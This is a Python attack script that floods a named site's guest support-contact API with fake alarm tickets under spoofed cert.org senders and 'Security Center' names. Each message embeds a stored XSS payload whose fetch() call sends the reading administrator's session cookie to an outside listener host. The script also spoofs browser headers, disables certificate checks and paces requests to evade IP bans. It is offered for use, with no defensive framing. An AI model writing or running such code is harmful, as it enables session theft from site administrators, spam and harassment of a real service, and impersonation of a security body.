import requests
import random
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://seodomains.com.hr/api/guest/support/contact"
# The payload sends the cookie to our listener when the admin reads the message
XSS_PAYLOAD = '<script>fetch("http://interceptor.astro.net/steal?c="+document.cookie)</script>'

SUBJECTS = [
    "URGENT: Server 46.183.184.147 ROOT COMPROMISED",
    "CRITICAL: Customer Database LEAKED on DarkWeb",
    "DMCA Takedown Notice - IMMEDIATE ACTION REQUIRED",
    "FOSSBilling Critical Vulnerability Exploited - Patch Now",
    "Payment Gateway Error: $50,000 Transaction Failed",
    "Abuse Report: Phishing Detected on your Network"
]

MESSAGES = [
    f"We found your database. Check proof here: {XSS_PAYLOAD}",
    f"Admin, your server is mining crypto. Logs attached: {XSS_PAYLOAD}",
    f"I cannot login to my C2 panel. Fix this! {XSS_PAYLOAD}",
    f"Why is my credit card charged 10 times? Refund me! {XSS_PAYLOAD}"
]

def flood():
    print("[!!!] INITIATING PANIC FLOOD - NO CHOICE PROTOCOL...")
    count = 0
    while True:
        try:
            subj = random.choice(SUBJECTS)
            msg = random.choice(MESSAGES)
            email = f"urgent_alert_{random.randint(1000,9999)}@cert.org"
            
            payload = {
                "name": "Security Center",
                "email": email,
                "subject": subj,
                "message": msg
            }
            
            # Simulate real browser headers
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Referer": "https://seodomains.com.hr/contact-us"
            }
            
            r = requests.post(TARGET, data=payload, headers=headers, verify=False, timeout=5)
            
            if r.status_code == 200:
                count += 1
                print(f"[+] Panic Ticket #{count} SENT: {subj}")
            else:
                print(f"[-] Failed: {r.status_code}")
                
            time.sleep(2) # Speed balanced to avoid instant IP ban
            
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    flood()
